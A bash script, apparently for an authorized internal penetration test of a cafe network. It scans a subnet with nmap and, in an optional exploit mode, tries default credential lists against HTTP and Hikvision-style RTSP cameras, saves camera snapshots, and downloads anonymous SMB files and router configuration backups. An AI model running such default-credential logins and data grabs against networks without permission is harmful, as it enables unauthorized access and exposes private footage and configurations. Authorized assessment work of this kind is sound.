#!/usr/bin/env bash
# cafe_full_pentest.sh
# Recon + Safe Exploit (default-creds / anonymous-only) for internal pentest of cafe network
# USAGE:
#   sudo ./cafe_full_pentest.sh <subnet> [--exploit]
# Eg:
#   sudo ./cafe_full_pentest.sh 192.168.68.0/24 --exploit
#
# IMPORTANT: Only use with written authorization explicitly permitting these tests.
# This script performs non-destructive checks only (no password spraying, no RCE payloads).
#
# Dependencies:
#   nmap, nc, curl, ffmpeg (or ffprobe), smbclient, smbmap (optional), enum4linux (optional),
#   whatweb, nikto, snmpwalk, upnpc (miniupnpc) or gssdp-discover/avahi, jq (optional)
#
set -euo pipefail
IFS=$'\n\t'

SUBNET="${1:-}"
EXPLOIT_MODE=false
if [ "${2:-}" == "--exploit" ]; then EXPLOIT_MODE=true; fi

if [ -z "$SUBNET" ]; then
  echo "Usage: sudo $0 <subnet> [--exploit]"
  exit 1
fi

OUTDIR="cafe_pentest_$(date +%F_%H-%M-%S)"
mkdir -p "$OUTDIR"
echo "[*] Output -> $OUTDIR"
echo "[*] SUBNET: $SUBNET"
echo "[*] Exploit mode: $EXPLOIT_MODE"
echo

# small safe default credential lists (limited; NO BRUTE FORCE)
HTTP_DEFAULTS=( "admin:admin" "admin:password" "admin:1234" "root:root" "admin:12345" )
HIKVISION_DEFAULTS=( "admin:12345" "admin:12345678" "admin:admin" )
SMB_GUEST_CHECK=true  # check anonymous
RTSP_DEFAULTS=( "admin:12345" "admin:12345678" )

# helper log functions
log(){ echo "[$(date +'%F %T')] $*"; }
warn(){ echo "WARN: $*" >&2; }
err(){ echo "ERROR: $*" >&2; }

# Check dependencies
deps=(nmap nc curl ffmpeg smbclient whatweb nikto snmpwalk upnpc)
MISSING=()
for d in "${deps[@]}"; do
  if ! command -v "$d" &>/dev/null; then
    MISSING+=("$d")
  fi
done
if [ ${#MISSING[@]} -ne 0 ]; then
  warn "Missing tools: ${MISSING[*]}. Install them for full functionality. Script will continue with available tools."
fi

##################
# 1) Discover hosts
##################
log "Discovering live hosts in $SUBNET..."
nmap -sn "$SUBNET" -oG "$OUTDIR/hosts.gnmap" >/dev/null
grep "Up" "$OUTDIR/hosts.gnmap" | awk '{print $2}' > "$OUTDIR/hosts.txt" || true
HOSTS=()
if [ -s "$OUTDIR/hosts.txt" ]; then
  mapfile -t HOSTS < "$OUTDIR/hosts.txt"
else
  warn "No hosts found in $SUBNET"
  exit 0
fi
log "Found ${#HOSTS[@]} hosts."

##################
# 2) Per-host scans
##################
for ip in "${HOSTS[@]}"; do
  log "=== Processing $ip ==="
  HOSTDIR="$OUTDIR/$ip"
  mkdir -p "$HOSTDIR"

  # Quick top ports + service detection (safe)
  log "nmap: top-ports & service/version"
  nmap -sS -sV -O --top-ports 1000 -T4 "$ip" -oN "$HOSTDIR/nmap_top1000.txt" >/dev/null || true

  # Full TCP quick scan for open interesting ports (limited to speed)
  log "nmap: scanning common service ports (HTTP/RTSP/SMB/RDP/SSH/SNMP/UPnP)"
  nmap -p 21,22,23,53,80,88,135,139,143,161,389,443,445,5000,5060,554,5900,5938,5985,8000,8080,8443,9000,9001,10000,49152-49160 -sS -T4 "$ip" -oN "$HOSTDIR/nmap_services.txt" >/dev/null || true

  # NSE vuln checks (safe scripts group vuln)
  log "nmap: NSE vuln scripts (safe subset)"
  nmap --script vuln --script-args=unsafe=0 -p- -T3 "$ip" -oN "$HOSTDIR/nmap_vuln.txt" >/dev/null || true

  # Banner grab for unknown ports
  log "Banner grabbing (nc) for open ports found"
  grep '^PORT' -n "$HOSTDIR/nmap_services.txt" >/dev/null 2>&1 || true
  # parse open ports
  OPEN_PORTS=$(grep "/tcp" "$HOSTDIR/nmap_services.txt" | awk '/open/{print $1}' | sed 's#/tcp##g' || true)
  echo "$OPEN_PORTS" > "$HOSTDIR/open_ports.list"
  for p in $OPEN_PORTS; do
    log "banner: $ip:$p"
    (timeout 3 bash -c "echo | nc -w 3 $ip $p" ) > "$HOSTDIR/banner_$p.txt" 2>&1 || true
  done

  # HTTP enumeration
  if grep -qE "80/tcp.*open|443/tcp.*open|8080/tcp.*open|8443/tcp.*open|8000/tcp.*open" "$HOSTDIR/nmap_services.txt"; then
    log "HTTP service(s) detected. Running whatweb + nikto (safe)."
    if command -v whatweb &>/dev/null; then whatweb -v "http://$ip" > "$HOSTDIR/whatweb_http.txt" 2>&1 || true; fi
    if command -v nikto &>/dev/null; then nikto -host "http://$ip" -output "$HOSTDIR/nikto_http.txt" >/dev/null 2>&1 || true; fi
    # try fetching common config/backup endpoints (read-only attempts)
    CANDIDATES=( "/config" "/Backup" "/backup" "/config.cfg" "/sysconfig" "/admin/config" "/deviceinfo.xml" "/getcfg.php" "/cgi-bin/config.cfg" "/api/config" "/boaform/admin/formBackup" "/setup.xml" )
    for pth in "${CANDIDATES[@]}"; do
      for proto in http https; do
        url="${proto}://$ip$pth"
        if curl -m 6 -sS -I "$url" | grep -qi "200\|Content-Type"; then
          log "Possible readable endpoint: $url"
          curl -m 10 -sS "$url" > "$HOSTDIR/http_$(echo $pth | tr '/?&' '_').txt" || true
        fi
      done
    done
  fi

  # UPnP/SSDP info
  if grep -q "1900/tcp\|1900/udp" "$HOSTDIR/nmap_services.txt" || true; then
    if command -v upnpc &>/dev/null; then
      log "Running upnpc -l for UPnP data"
      upnpc -l > "$HOSTDIR/upnp.txt" 2>&1 || true
    fi
  fi

  # SNMP public community check (read-only)
  if grep -q "161/tcp.*open\|161/udp" "$HOSTDIR/nmap_services.txt" || true; then
    if command -v snmpwalk &>/dev/null; then
      log "Checking SNMP public community (public)."
      snmpwalk -v2c -c public "$ip" 1.3.6.1.2.1 > "$HOSTDIR/snmp_public.txt" 2>&1 || true
    fi
  fi

  # RTSP (possible CCTV / AirPlay)
  if grep -qE "554/tcp.*open|5000/tcp.*open|7000/tcp.*open" "$HOSTDIR/nmap_services.txt"; then
    log "RTSP/AirPlay-like service detected. Probing with OPTIONS"
    if command -v curl &>/dev/null; then
      printf 'OPTIONS * RTSP/1.0\r\nCSeq: 1\r\n\r\n' | nc -w3 "$ip" 5000 > "$HOSTDIR/rtsp_5000_options.txt" 2>&1 || true
      printf 'OPTIONS * RTSP/1.0\r\nCSeq: 1\r\n\r\n' | nc -w3 "$ip" 7000 > "$HOSTDIR/rtsp_7000_options.txt" 2>&1 || true
    fi
  fi

  # SMB anonymous check (safe read-only)
  if grep -q "445/tcp.*open" "$HOSTDIR/nmap_services.txt"; then
    if command -v smbclient &>/dev/null; then
      log "Checking SMB anonymous guest access"
      smbclient -L "//$ip" -N > "$HOSTDIR/smbclient_list.txt" 2>&1 || true
      if grep -qi "Anonymous login" "$HOSTDIR/smbclient_list.txt" || grep -qi "Disk" "$HOSTDIR/smbclient_list.txt"; then
        log "SMB listing successful - inspecting shares (read-only)."
        # list and attempt to get small README files from shares (non-destructive)
        SHARES=$(awk '/Disk/{print $1}' "$HOSTDIR/smbclient_list.txt" | tr -d ' ' || true)
        for s in $SHARES; do
          mkdir -p "$HOSTDIR/smbshares/$s"
          # attempt to fetch README or config from top-level
          smbclient "//$ip/$s" -N -c "ls; get README.txt README.txt" > "$HOSTDIR/smb_$s.txt" 2>&1 || true
        done
      fi
    fi
  fi

  #########################
  # Optional Exploit Checks (limited & safe)
  #########################
  if [ "$EXPLOIT_MODE" = true ]; then
    log "EXPLOIT MODE: running safe checks on $ip (DEFAULT CREDENTIALS, ANON ACCESS)."

    # 1) HTTP default credentials (very limited list)
    if grep -qE "80/tcp.*open|443/tcp.*open|8080/tcp.*open|8443/tcp.*open" "$HOSTDIR/nmap_services.txt"; then
      log "Testing small HTTP default credential list on $ip (no brute force)."
      for cred in "${HTTP_DEFAULTS[@]}"; do
        user="${cred%%:*}"; pass="${cred##*:}"
        # try basic auth with curl; detect successful pages by not being 401/403
        http_status=$(curl -s -o /dev/null -w "%{http_code}" -u "$user:$pass" -k "http://$ip/" || true)
        if [ "$http_status" != "401" ] && [ "$http_status" != "403" ] && [ -n "$http_status" ]; then
          echo "[+] HTTP default-cred SUCCESS: $ip -> $user:$pass" | tee -a "$HOSTDIR/exploit_findings.txt"
        fi
      done
    fi

    # 2) Hikvision / RTSP default creds (admin:12345 etc)
    if grep -qE "554/tcp.*open|5000/tcp.*open|7000/tcp.*open" "$HOSTDIR/nmap_services.txt"; then
      log "Testing RTSP default credentials (Hikvision-like)."
      for pass in "${HIKVISION_DEFAULTS[@]}"; do
        # use ffmpeg to attempt a single-frame snapshot (timeout short). If it returns frame, record success.
        SNAPSHOT="$HOSTDIR/rtsp_snapshot_${pass}.jpg"
        timeout 8 ffmpeg -rtsp_transport tcp -i "rtsp://admin:${pass}@${ip}:554/" -frames:v 1 -y "$SNAPSHOT" >/dev/null 2>&1 || true
        if [ -s "$SNAPSHOT" ]; then
          echo "[+] RTSP: anonymous/default access (admin:$pass) on $ip -> saved $SNAPSHOT" | tee -a "$HOSTDIR/exploit_findings.txt"
        else
          rm -f "$SNAPSHOT" || true
        fi
      done
      # Also test AirPlay no-pairing by sending OPTIONS (if response code present, likely no pairing)
      printf 'OPTIONS * RTSP/1.0\r\nCSeq: 1\r\n\r\n' | nc -w3 "$ip" 5000 > /tmp/rtsp_test.$$
      if grep -qi "RTSP/1.0" /tmp/rtsp_test.$$ 2>/dev/null; then
        echo "[+] RTSP service responded -> may accept unauthenticated control/announce (confirm manually)" | tee -a "$HOSTDIR/exploit_findings.txt"
      fi
      rm -f /tmp/rtsp_test.$$ || true
    fi

    # 3) SMB anonymous file fetch
    if grep -q "445/tcp.*open" "$HOSTDIR/nmap_services.txt"; then
      if command -v smbclient &>/dev/null; then
        log "Attempt anonymous SMB download of small, non-sensitive files (README, info.txt) if present."
        smbclient -L "//$ip" -N > "$HOSTDIR/smbclient_list2.txt" 2>&1 || true
        SHARES=$(awk '/Disk/{print $1}' "$HOSTDIR/smbclient_list2.txt" | tr -d ' ' || true)
        for s in $SHARES; do
          for fname in README.txt readme.txt info.txt device-info.txt; do
            smbclient "//$ip/$s" -N -c "get $fname $HOSTDIR/smb_${s}_${fname}" >/dev/null 2>&1 || true
            if [ -s "$HOSTDIR/smb_${s}_${fname}" ]; then
              echo "[+] Found file via SMB: //$ip/$s/$fname -> $HOSTDIR/smb_${s}_${fname}" | tee -a "$HOSTDIR/exploit_findings.txt"
            fi
          done
        done
      fi
    fi

    # 4) Try fetching common router backup endpoints (read-only)
    if grep -qE "80/tcp.*open|443/tcp.*open" "$HOSTDIR/nmap_services.txt"; then
      log "Attempting read-only retrieval of common router backup/config endpoints (no auth escalation)."
      endpts=( "/backup.cfg" "/backup" "/config.bin" "/config" "/getcfg" "/cgi-bin/backup" "/boaform/admin/formBackup" "/download.cfg" "/download" )
      for e in "${endpts[@]}"; do
        for proto in http https; do
          url="${proto}://$ip${e}"
          httpcode=$(curl -s -o /dev/null -w "%{http_code}" -k "$url" || true)
          if [ "$httpcode" == "200" ]; then
            echo "[!] POSSIBLE exposed backup at $url -> saving to $HOSTDIR/$(basename $e).raw" | tee -a "$HOSTDIR/exploit_findings.txt"
            curl -k -sS "$url" -o "$HOSTDIR/backup_$(basename $e).bin" || true
          fi
        done
      done
    fi

    # 5) UPnP: try to enumerate device description (safe)
    if command -v upnpc &>/dev/null; then
      log "Running UPnP enumeration (upnpc -l)"
      upnpc -l > "$HOSTDIR/upnp_output.txt" 2>&1 || true
    fi

    # 6) Sniff/packet capture is out-of-scope to run automatically in this script. If you want captures, run tcpdump manually and get written consent.
  fi

  # -- end per-host
  log "Finished host $ip; artifacts in $HOSTDIR"
done

# 3) Summary/aggregate
log "Building summary"
echo "HOST,OPEN_PORTS,NOTES" > "$OUTDIR/summary.csv"
for ip in "${HOSTS[@]}"; do
  OP=$(tr '\n' ' ' < "$OUTDIR/$ip/open_ports.list" 2>/dev/null || echo "")
  NOTES=""
  if [ -f "$OUTDIR/$ip/exploit_findings.txt" ]; then
    NOTES=$(tr '\n' '|' < "$OUTDIR/$ip/exploit_findings.txt")
  fi
  echo "$ip,\"$OP\",\"$NOTES\"" >> "$OUTDIR/summary.csv"
done

log "Done. ALL OUTPUT -> $OUTDIR"
log "Please review files under $OUTDIR. Any sensitive data discovered should be handled per the agreement with the client."

exit 0
